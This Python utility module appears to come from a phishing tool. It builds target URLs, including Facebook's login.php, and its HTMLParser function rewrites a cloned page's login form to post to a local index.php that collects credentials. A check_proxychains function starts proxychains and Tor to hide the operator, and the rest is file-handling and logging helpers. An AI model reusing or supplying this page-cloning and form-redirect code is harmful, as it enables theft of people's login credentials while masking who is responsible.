import Setup.setup as setup
import bs4
import os
import socket
from datetime import datetime

def command(commands,cmd):
    '''Generalise the Unix <-> Windows commans'''
    return commands[cmd][os.name]

def construct_url(url):
    '''
    build the url depending on what the user inputs

    :param      url:        user input:         str
    :return:    url:        builded url:        str
                siteDomain: domain of the site: str
    '''
    if 'www' in url:
        siteDomain = url.split(".")[1]
        if 'facebook' in siteDomain:
            url = "https://%s/login.php?" % url
        else:
            url = "https://%s" % url
    else:
        siteDomain = url
        if url == 'facebook':
            url = "https://%s.com/login.php?" % url
        else:
            url = "https://%s.com" % url
    return url, siteDomain

def HTMLParser(fileName, outputFile):
    '''
    Edits the action parameter of the form to index.txt of the file "filename"

    :param      fileName:   input of the file: str
    :param      outputFile: edited file:       str
    :return:    void
    '''

    f = open(fileName, 'r')
    txt = f.read()
    soup = bs4.BeautifulSoup(txt, features='lxml')
    tag = soup.form
    tag['action'] = "index.php"
    f.close()
    print("---------------------------------------------")
    print("---------------------------------------------")
    print("---------------------------------------------")
    print("---------------------------------------------")
    html = soup.prettify("utf-8")
    with open(outputFile, "wb") as file:
        file.write(html)

def ifexists(fileName):
    '''
    Checks the existence of a file
        if False creates it and saves it't location in 'fileName'
        if True, asks if to overwrirte the file
            if False recalls the function with a new input

    :param:     fineName:       str
    :return:    outputFileName: str
    '''

    slash = command(setup.commands,'slash')
    #path = fileName.split(slash)
    dir = ''
    if slash in fileName:
        dir = slash.join(fileName.split(slash)[:1])
    if os.path.exists(fileName) == False:
        print('[*] Creating the file %s' % fileName)
        os.system("%s %s" % (command(setup.commands,'create'), fileName))
        print('[+] %s created' % fileName)
        return fileName
    else:
        print("%s already exists" % fileName)
        x = str(input("\tDo you want to overwrite it? y/n "))
        if x == 'y' or x == 'Y'  or x == 'yes':
            print('[*] Overwriting the file %s ....' % fileName)
            os.system("%s %s" % (command(setup.commands, 'create'), fileName))
            print('[+] %s overwritten' % fileName)
            return fileName
        elif x == 'n' or x == 'N' or x == 'no':
            output = str(input('output file: '))
            if not dir:
                return ifexists(output)
            else:
                return ifexists('%s%s%s' % (dir, slash, output))
        else:
            print('[-] Invalid input')
            return ifexists(fileName)

def check_proxychains(proxychains):
    '''
    Cheks the existence of the proxychains.conf file
    and sets the proxychans and tor options defines in the "Setup.setup.py" file
    :param   proxychains: int
    :return: proxychains: int
    '''
    if setup.proxychains == "On" or setup.proxychains == "on" or setup.proxychains == "ON":
        print("proxychains is set to 'on'")
        print("[*] Cheking the /etc/proxychains.conf file")
        if os.path.isfile("/etc/proxychains.conf"):
            print("[+] /etc/proxychains.conf file exists")
            proxychains = 1
            print("[+] proxychains is activated")
            if setup.tor == "On" or setup.tor == "on" or setup.tor == "ON":
                print("tor is set to On")
                cmd = "sudo service tor start"
                print("[*] Activating tor with\n\t%s" % cmd)
                try:
                    os.system(cmd)
                    print("[+] tor activated")
                except:
                    print("[-] Unable to activate tor")
        else:
            print("[-] /etc/proxychains.conf does not exist. Unable to activate proxychains")
            proxychains = 0
    return proxychains

def get_ip():
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        return (host_name, host_ip)
    except:
        print("Unable to get Hostname and IP")
        return

def getVersion():
    os.system('python --version "$1" > tempFile 2>&1')
    pythonVersion = open('tempFile', 'r').readline().split("Python ")[1].strip('\n')
    #pythonVersion = open('tempFile', 'r').readline().split("python ")[1].split(")")[0]
    if '3' in pythonVersion:
        version = ""
    elif '2' in pythonVersion:
        version = '3'
    return version

def exception_handeler(error, file):
    now = datetime.now()
    with open("Logs/"+file+".txt", 'a') as f:
        f.write("*"*90+"\n")
        f.write(str(now.strftime("%d/%m/%Y %H:%M:%S"))+"\n")
        f.write(error+"\n\n")
